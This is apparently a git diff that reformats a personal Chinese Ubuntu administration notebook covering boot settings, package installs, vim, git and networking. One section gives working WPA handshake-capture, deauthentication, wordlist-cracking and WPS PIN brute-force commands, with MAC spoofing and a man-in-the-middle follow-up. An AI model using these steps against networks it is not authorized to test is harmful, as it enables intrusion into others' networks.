@@ -1,5 +1,6 @@
 # Ubuntu管理日记
 
+
 ## 酷炫Ubuntu
 
  - 开机时间：
@@ -18,18 +19,18 @@
 - win+Ubuntu双系统：
 	+ 参见我的csdn：http://blog.csdn.net/a550461053/article/details/58822451
 
- - win与Ubuntu双系统启动顺序：
+- win与Ubuntu双系统启动顺序：
 	- 修改/etc/default/grub
 	- 定位到GRUB_DEFAULT=0
 	- 后面数字代表启动项位置-1，我的win7启动项在第4位，所以数字改为3
 	- sudo update-grub 更新启动列表
 
- - 减少等待时间：
+- 减少等待时间：
 	- sudo gedit /etc/default/grub
 	- 修改TIMEOUT=1
 	- sudo update-grub2
 
- - 减少swap的作用：默认是60
+- 减少swap的作用：默认是60
 	- sudo sysctl vm.swappiness=10 //暂时生效
 	- sudo gedit /etc/sysctl.conf
 	- vm.swappiness=10 //添加
@@ -42,10 +43,10 @@
 - 快捷键：
 	+ vi的时候，使用ctrl+s会锁定屏幕，无法输入，使用ctrl+q解锁即可
 	+ 
- - 移动Unity所处位置：
+- 移动Unity所处位置：
     gsettings set com.canonical.Unity.Launcher launcher-position Bottom
 
- - 桌面实时流量：
+- 桌面实时流量：
 	- sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor 
 	- sudo apt-get update 
 	- sudo apt-get install indicator-sysmonitor 
@@ -53,18 +54,18 @@
 	- 自启动在软件自己的设置里面
 	- 显示的内容可自定义
 
- - 创建链接文件：软链接即可，可跨文件系统：ln -s 源文件 目标文件
+- 创建链接文件：软链接即可，可跨文件系统：ln -s 源文件 目标文件
  	- sudo ln -s /usr/local/anaconda3/bin/python /usr/bin/python
 	- 跨文件系统，需要自动mount ： sudo gedit /etc/fstab
 	- /dev/sda1 /media/win-C ntfs nls=utf8,umask=000   0   0
 
- - 创建桌面快捷方式：
+- 创建桌面快捷方式：
 
 - 网卡的时候：
 	+ 一般是由于ipv6+ipv4混用造成的，把网络连接选项的ipv6选为ignore即可；但还是能够上ipv6~
 
- - 中文编码：locale查看支持的字符集
-   - win下还是要使用sublime，不用txt打开文件。
+- 中文编码：locale查看支持的字符集
+- win下还是要使用sublime，不用txt打开文件。
 	 sudo gedit /etc/environment
 	可以看到如下内容：
 	PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
@@ -125,7 +126,6 @@
 		- 直接点击super也可以
 		- 选择最大连接数16
 		- plugin选择aria2
-	- 
 
 - wifi热点:
 	- sudo apt install plasma-nm
@@ -366,7 +366,6 @@
 		- 解决: sudo apt install python-tk
 	- 运行: labelme
 
-
 - 安装vim，然后安装fish，更好的shell界面：
 	- sudo apt-get fish
 	- fish
@@ -436,7 +435,6 @@
 		+ sudo apt remove golang-go
 		+ sudo apt remove --auto-remove golang-go
 		+ source ~/.bashrc # 使生效
-		+ 
 
 - pycharm安装：
 	1. 获取pycharm.tar.gz
@@ -479,11 +477,8 @@
 	- sudo rm /usr/share/mime/packages/kde.xml 
 	- sudo update-mime-database /usr/share/mime
 	- sudo dpkg -i xmind-7.5-linux_amd64.deb
-
- 
 - Atom:
 	- Google开发的文本编辑器
-
 - 截图工具:
 	- 法1:
 		- sudo apt install shutter
@@ -493,7 +488,6 @@
 		- 图片裁剪:
 			- sudo apt install gthumb
 			- gthumb启动编辑软件
-
 - tar:
         tar 参数：
           -c：将文件打包（但不压缩）create
@@ -593,7 +587,7 @@ python3:
 	+ reboot
 
 - 安装xgboost：
-
+	+ pass
 
 
 ## 常用命令
@@ -719,7 +713,6 @@ python3:
 			2，找到“所有网络”下面的“密码保护的共享”，选择“关闭密码保护共享”。
 	5. 记得把虚拟记得设置：共享启用；
 
-
 - IP网络配置:
 	sudo gedit /etc/network/interfaces
 	# net for xingongsuo
@@ -843,10 +836,12 @@ python3:
 	+ iperf
 	+ netperf
 
+
 ## shell使用:
 1. ll -rt
 
-# vim技巧：
+
+## vim技巧：
 
  - 配置vim：https://github.com/ma6174/vim
  - 手动配置vim：
@@ -863,7 +858,6 @@ python3:
  	+ set softtabstop=4 "设置tab键宽度
  	+ syntax on "语法检查，语法高亮
  	+ colorscheme cpp "使用cpp高亮方案
- 	+ 
 
 - vim技巧：
 	1. w跳词头，e跳词尾
@@ -893,6 +887,7 @@ python3:
 	
 3. 最终打开：
 	- https://a550461053.github.io/hacker
+
 
 ## git使用:
 0. 选择问题：
@@ -1064,7 +1059,6 @@ python3:
 9. htop
 	- sudo pacman -S htop
 10. weather report
-11. 
 
 
 ## kali-linux:
@@ -1083,77 +1077,76 @@ python3:
 			- 1 2 back 4
 			- dash中搜索：indicator
 
+
 ## wifi破解:
-	- 准备:
-		- service network-manager stop
-		- 杀掉进程: sudo airmon-ng check kill
-		- 如果要恢复wifi使用, 
-			- 需要: airmon-ng stop wlan0
-			- 然后: sudo service network-manager start
-	- 1.查看无线网卡: airmon-ng ; ifconfig 
-	- 隐藏自己, 修改mac:
-		- 先停止无线接口:
-			- airmon-ng stop wlp3s0
-			- 或者: ifconfig wlp3s0 down
-		- macchanger --mac 00:11:22:33:44:55 wlp3s0
-		- 重启无线接口:
-			- airmon-ng start wlp3s0
-	- 若启动失败:
-		- rfkill list
-		- 解锁全部: rfkill unblock all
-	- 2.搜索无线:
-		- start后发现monitor mode在mon9:
-			- sudo airodump-ng mon9
-			- 显示很慢..
-		- 关闭nm管理:
-			- sudo service network-manager stop # 停止nm服务
-			- 或者: sudo /etc/init.d/network-manager stop
-			- 取消开机启动: chkconfig network-manager off
-		- 关闭wpa_supplicant:(不需要)
-			- wpa_supplicant用来对数据流进行加密, 在网卡up的时候启动;
-	- 3.抓取握手包：
-		- sudo airodump-ng -c 6 --bssid C8:3A:35:30:C8:12 -w ~/yuyu mon9
-		- -c表示channel，-w表示保存的路径和前缀名	
-	- 4.强行设备重连：
-		- 新建一个终端
-		- aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:45:00:CC mon9
-		- -0表示发起deauthentication泛洪攻击，2表示断开次数，-a是BSSID，-c是设备
-		- 若成功，则上一步会捕捉到握手包，显示WPA handshake:
-		- 断开监控：airmon-ng stop mon9
-	- 5.破解：
-		- aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rock.txt ~/yuyu01.cap
-		- yuyu01.cap就是上一步捕捉到的握手包yuyu01.cap
-		- 后记可以使用GPU加速破解
-	- WPS破解pin:
-		- pin码:
-			- 8位纯数字组成的识别码:
-				- 1234 + 567 + 0
-				- 第一部分和第二部分没关联
-				- 最后的0是对第二部分的校验码
-			- 破解:	
-				- 先对单独的第一部分pin匹配, 一共0000-9999
-				- 然后确定第二部分, 一共000-999
-				- 最后一位自动得出
-				- 一共11000种情况
-		- 扫描路由器是否开启WPS功能:
-			- wash -i wlan0
-			- WPS Locked为no的都可以破解
-		- 使用reaver破解:
-			- reaver -i mon0 -b mac -S -vv
-			- -b目标mac地址, -S最小的DH key, -vv显示警告
-			- reaver默认从0000开始, 加上-p 9000就是从9000开始
-			- pin过快会pin死路由器, 加上-d5 -t5延迟5秒
-	- 升级hacker:
-		- 获取wifi密码后, 可以进一步使用kali下的中间人攻击, 从而进行流量分析
-	- 总结:
-		- wifi密码不要和路由器的管理密码一样
-		- 关闭路由器的WPS功能
-		- 使用路由器的白名单功能
-		- 不要连接公共wifi
+- 准备:
+	- service network-manager stop
+	- 杀掉进程: sudo airmon-ng check kill
+	- 如果要恢复wifi使用, 
+		- 需要: airmon-ng stop wlan0
+		- 然后: sudo service network-manager start
+- 1.查看无线网卡: airmon-ng ; ifconfig 
+- 隐藏自己, 修改mac:
+	- 先停止无线接口:
+		- airmon-ng stop wlp3s0
+		- 或者: ifconfig wlp3s0 down
+	- macchanger --mac 00:11:22:33:44:55 wlp3s0
+	- 重启无线接口:
+		- airmon-ng start wlp3s0
+- 若启动失败:
+	- rfkill list
+	- 解锁全部: rfkill unblock all
+- 2.搜索无线:
+	- start后发现monitor mode在mon9:
+		- sudo airodump-ng mon9
+		- 显示很慢..
+	- 关闭nm管理:
+		- sudo service network-manager stop # 停止nm服务
+		- 或者: sudo /etc/init.d/network-manager stop
+		- 取消开机启动: chkconfig network-manager off
+	- 关闭wpa_supplicant:(不需要)
+		- wpa_supplicant用来对数据流进行加密, 在网卡up的时候启动;
+- 3.抓取握手包：
+	- sudo airodump-ng -c 6 --bssid C8:3A:35:30:C8:12 -w ~/yuyu mon9
+	- -c表示channel，-w表示保存的路径和前缀名	
+- 4.强行设备重连：
+	- 新建一个终端
+	- aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:45:00:CC mon9
+	- -0表示发起deauthentication泛洪攻击，2表示断开次数，-a是BSSID，-c是设备
+	- 若成功，则上一步会捕捉到握手包，显示WPA handshake:
+	- 断开监控：airmon-ng stop mon9
+- 5.破解：
+	- aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rock.txt ~/yuyu01.cap
+	- yuyu01.cap就是上一步捕捉到的握手包yuyu01.cap
+	- 后记可以使用GPU加速破解
+- WPS破解pin:
+	- pin码:
+		- 8位纯数字组成的识别码:
+			- 1234 + 567 + 0
+			- 第一部分和第二部分没关联
+			- 最后的0是对第二部分的校验码
+		- 破解:	
+			- 先对单独的第一部分pin匹配, 一共0000-9999
+			- 然后确定第二部分, 一共000-999
+			- 最后一位自动得出
+			- 一共11000种情况
+	- 扫描路由器是否开启WPS功能:
+		- wash -i wlan0
+		- WPS Locked为no的都可以破解
+	- 使用reaver破解:
+		- reaver -i mon0 -b mac -S -vv
+		- -b目标mac地址, -S最小的DH key, -vv显示警告
+		- reaver默认从0000开始, 加上-p 9000就是从9000开始
+		- pin过快会pin死路由器, 加上-d5 -t5延迟5秒
+- 升级hacker:
+	- 获取wifi密码后, 可以进一步使用kali下的中间人攻击, 从而进行流量分析
+- 总结:
+	- wifi密码不要和路由器的管理密码一样
+	- 关闭路由器的WPS功能
+	- 使用路由器的白名单功能
+	- 不要连接公共wifi
 
  
-
-
 ## nodejs
 0. mogodb:
 	- sudo apt install mongo
